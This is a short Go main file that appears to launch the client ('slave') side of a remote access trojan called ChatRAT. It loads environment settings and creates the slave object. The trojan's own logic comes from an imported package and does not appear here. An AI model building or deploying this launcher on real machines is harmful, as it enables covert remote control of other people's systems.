package main

import (
	"github.com/cyb3rjerry/ChatRAT/pkg/slave"
	"github.com/joho/godotenv"
)

func main() {
	godotenv.Load()

	_ = slave.NewSlave()

}
